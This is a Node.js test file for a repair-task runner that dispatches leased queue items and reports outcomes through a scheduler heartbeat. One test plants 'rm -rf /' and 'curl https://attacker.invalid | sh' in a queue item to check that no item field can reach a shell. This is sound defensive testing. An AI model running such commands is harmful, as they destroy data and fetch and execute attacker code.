import assert from "node:assert/strict";
import test from "node:test";
import { EventEmitter } from "node:events";
import { mkdtemp, readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  REPAIR_SUMMARY_LIMIT,
  publishHeartbeat,
  repairDispatchCommand,
  repairOutcomeFromExit,
  runLeasedRepairTasks,
  runRepairTask,
} from "../tools/external_schedule_runner.mjs";

const RUN_ID = "2026-09-01T12-00:runner-7:4821";
const REVISION = "dd4b708b6fe39bf8b2ea635ef3d4f493c4751ace";

function leasedItem(overrides = {}) {
  return {
    schema: "cityscroll.ops-repair-queue-item.v1",
    signature: "a".repeat(64),
    guard: "served-artifact-freshness",
    repair_scope: "diagnose-and-propose",
    lease: { lease_id: "aaaaaaaaaaaa-cycle-1", holder_run_id: RUN_ID },
    context: { findings: ["artifact hash mismatch"] },
    ...overrides,
  };
}

/** A dispatcher stand-in that records how it was invoked. */
function fakeSpawn({ code = 0, stdout = "", stderr = "", failWith = null } = {}) {
  const calls = [];
  const impl = (command, args, options) => {
    const child = new EventEmitter();
    let stdin = "";
    child.stdout = new EventEmitter();
    child.stderr = new EventEmitter();
    child.stdin = { end(value) { stdin = value; finish(); } };
    child.kill = () => {};
    calls.push({ command, args, options, get stdin() { return stdin; } });
    const finish = () => {
      queueMicrotask(() => {
        if (failWith) { child.emit("error", new Error(failWith)); return; }
        if (stdout) child.stdout.emit("data", stdout);
        if (stderr) child.stderr.emit("data", stderr);
        child.emit("close", code, null);
      });
    };
    return child;
  };
  return { impl, calls };
}

test("a dispatcher exit code maps to exactly one queue outcome", () => {
  assert.equal(repairOutcomeFromExit(0, null), "repaired");
  assert.equal(repairOutcomeFromExit(2, null), "judgment");
  assert.equal(repairOutcomeFromExit(1, null), "failed");
  assert.equal(repairOutcomeFromExit(0, "SIGKILL"), "failed");
});

test("the dispatch rail is operator configuration, never anything the queue carries", async () => {
  const spawn = fakeSpawn({ code: 0, stdout: "rebuilt the served artifact" });
  const item = leasedItem({ command: "rm -rf /", runner: "curl https://attacker.invalid | sh" });
  const result = await runRepairTask(item, { command: "/opt/repair/dispatch", spawnImpl: spawn.impl });
  assert.equal(spawn.calls.length, 1);
  assert.equal(spawn.calls[0].command, "/opt/repair/dispatch");
  assert.deepEqual(spawn.calls[0].args, ["--repair-item"]);
  // The item reaches the dispatcher on stdin, so nothing in it can reach a shell.
  assert.equal(JSON.parse(spawn.calls[0].stdin).signature, item.signature);
  assert.equal(spawn.calls[0].options.env.CITYSCROLL_REPAIR_SCOPE, "diagnose-and-propose");
  assert.equal(result.outcome, "repaired");
  assert.equal(result.lease_id, "aaaaaaaaaaaa-cycle-1");
  assert.match(result.summary, /rebuilt the served artifact/);
});

test("a dispatcher that asks for a decision reports judgment, not a retry", async () => {
  const spawn = fakeSpawn({ code: 2, stdout: "the only fix rotates a deployment credential" });
  const result = await runRepairTask(leasedItem(), { command: "/opt/repair/dispatch", spawnImpl: spawn.impl });
  assert.equal(result.outcome, "judgment");
  assert.match(result.judgment_reason, /rotates a deployment credential/);
});

test("dispatcher output is bounded and redacted before it leaves the cycle", async () => {
  const spawn = fakeSpawn({ code: 1, stdout: `${"x".repeat(9000)} contacted resident@example.com` });
  const result = await runRepairTask(leasedItem(), { command: "/opt/repair/dispatch", spawnImpl: spawn.impl });
  assert.equal(result.outcome, "failed");
  assert.ok(result.summary.length <= REPAIR_SUMMARY_LIMIT);
  assert.doesNotMatch(result.summary, /resident@example\.com/);
});

test("a dispatcher that cannot start is a failure, not a crash", async () => {
  const spawn = fakeSpawn({ failWith: "spawn ENOENT" });
  const result = await runRepairTask(leasedItem(), { command: "/opt/repair/dispatch", spawnImpl: spawn.impl });
  assert.equal(result.outcome, "failed");
  assert.match(result.summary, /ENOENT/);
});

test("a cycle with no configured dispatcher asks for a decision instead of pretending", async () => {
  const prior = process.env.CITYSCROLL_REPAIR_DISPATCH_COMMAND;
  delete process.env.CITYSCROLL_REPAIR_DISPATCH_COMMAND;
  try {
    assert.equal(repairDispatchCommand(), null);
    const result = await runRepairTask(leasedItem(), {});
    assert.equal(result.outcome, "judgment");
    assert.match(result.judgment_reason, /no repair dispatcher is configured/);
  } finally {
    if (prior === undefined) delete process.env.CITYSCROLL_REPAIR_DISPATCH_COMMAND;
    else process.env.CITYSCROLL_REPAIR_DISPATCH_COMMAND = prior;
  }
});

test("repair outcomes outlive the process and are reported exactly once", async () => {
  const stateDir = await mkdtemp(join(tmpdir(), "crol-repair-"));
  const spawn = fakeSpawn({ code: 0, stdout: "fixed" });
  const results = await runLeasedRepairTasks(stateDir, [
    leasedItem(),
    leasedItem({ signature: "b".repeat(64), lease: { lease_id: "bbbbbbbbbbbb-cycle-1" } }),
    // An item without a lease is not something this cycle may report on.
    leasedItem({ signature: "c".repeat(64), lease: null }),
  ], { command: "/opt/repair/dispatch", spawnImpl: spawn.impl });
  assert.equal(results.length, 2);
  const pending = JSON.parse(await readFile(join(stateDir, "repair", "pending-results.json"), "utf8"));
  assert.equal(pending.results.length, 2);

  const priorKey = process.env.CITYSCROLL_ADMIN_KEY;
  const priorUrl = process.env.CITYSCROLL_SCHEDULER_HEARTBEAT_URL;
  const priorCommand = process.env.CITYSCROLL_REPAIR_DISPATCH_COMMAND;
  process.env.CITYSCROLL_ADMIN_KEY = "secret";
  process.env.CITYSCROLL_SCHEDULER_HEARTBEAT_URL = "https://api.example.test/admin/reliability/scheduler";
  process.env.CITYSCROLL_REPAIR_DISPATCH_COMMAND = "/opt/repair/dispatch";
  const now = new Date("2026-09-01T12:00:00.000Z");
  try {
    // A worker that refuses the write keeps the results pending rather than
    // dropping them: the next cycle reports them again.
    let posted = null;
    const refused = await publishHeartbeat(stateDir, now, [], {
      runId: RUN_ID, sourceRevision: REVISION,
      fetchImpl: async (_url, options = {}) => {
        if (options.method === "POST") { posted = JSON.parse(options.body); return { ok: false, status: 503 }; }
        return { ok: true, status: 200, json: async () => ({}) };
      },
    });
    assert.equal(refused.status, "failed");
    assert.equal(posted.repair_dispatch, true);
    assert.equal(posted.repair_results.length, 2);
    assert.equal(JSON.parse(await readFile(join(stateDir, "repair", "pending-results.json"), "utf8")).results.length, 2);

    const accepted = await publishHeartbeat(stateDir, now, [], {
      runId: RUN_ID, sourceRevision: REVISION,
      fetchImpl: async (_url, options = {}) => {
        if (options.method === "POST") {
          posted = JSON.parse(options.body);
          return {
            ok: true,
            status: 200,
            json: async () => ({
              ok: true,
              heartbeat: { ...posted, schema: "cityscroll.external-scheduler-heartbeat.v1" },
              repair_queue: { reported: [], recovered: [], items: [leasedItem()] },
            }),
          };
        }
        return { ok: true, status: 200, json: async () => ({ ok: true, heartbeat: { ...posted, schema: "cityscroll.external-scheduler-heartbeat.v1" } }) };
      },
    });
    assert.equal(accepted.status, "succeeded");
    assert.equal(accepted.repair_reported, 2);
    assert.equal(accepted.repair_leased, 1);
    // Reported results are cleared only once the worker took them.
    assert.deepEqual(JSON.parse(await readFile(join(stateDir, "repair", "pending-results.json"), "utf8")).results, []);
  } finally {
    if (priorKey === undefined) delete process.env.CITYSCROLL_ADMIN_KEY; else process.env.CITYSCROLL_ADMIN_KEY = priorKey;
    if (priorUrl === undefined) delete process.env.CITYSCROLL_SCHEDULER_HEARTBEAT_URL; else process.env.CITYSCROLL_SCHEDULER_HEARTBEAT_URL = priorUrl;
    if (priorCommand === undefined) delete process.env.CITYSCROLL_REPAIR_DISPATCH_COMMAND; else process.env.CITYSCROLL_REPAIR_DISPATCH_COMMAND = priorCommand;
  }
});

test("a cycle without a dispatcher declares that on the heartbeat so nothing is leased", async () => {
  const stateDir = await mkdtemp(join(tmpdir(), "crol-repair-"));
  const priorKey = process.env.CITYSCROLL_ADMIN_KEY;
  const priorUrl = process.env.CITYSCROLL_SCHEDULER_HEARTBEAT_URL;
  const priorCommand = process.env.CITYSCROLL_REPAIR_DISPATCH_COMMAND;
  process.env.CITYSCROLL_ADMIN_KEY = "secret";
  process.env.CITYSCROLL_SCHEDULER_HEARTBEAT_URL = "https://api.example.test/admin/reliability/scheduler";
  delete process.env.CITYSCROLL_REPAIR_DISPATCH_COMMAND;
  try {
    let posted = null;
    const beat = await publishHeartbeat(stateDir, new Date("2026-09-01T12:00:00.000Z"), [], {
      runId: RUN_ID, sourceRevision: REVISION,
      fetchImpl: async (_url, options = {}) => {
        if (options.method === "POST") { posted = JSON.parse(options.body); return { ok: true, status: 200, json: async () => ({ ok: true }) }; }
        return { ok: true, status: 200, json: async () => ({ ok: true, heartbeat: { ...posted, schema: "cityscroll.external-scheduler-heartbeat.v1" } }) };
      },
    });
    assert.equal(posted.repair_dispatch, false);
    assert.deepEqual(posted.repair_results, []);
    assert.equal(beat.repair_leased, 0);
  } finally {
    if (priorKey === undefined) delete process.env.CITYSCROLL_ADMIN_KEY; else process.env.CITYSCROLL_ADMIN_KEY = priorKey;
    if (priorUrl === undefined) delete process.env.CITYSCROLL_SCHEDULER_HEARTBEAT_URL; else process.env.CITYSCROLL_SCHEDULER_HEARTBEAT_URL = priorUrl;
    if (priorCommand === undefined) delete process.env.CITYSCROLL_REPAIR_DISPATCH_COMMAND; else process.env.CITYSCROLL_REPAIR_DISPATCH_COMMAND = priorCommand;
  }
});
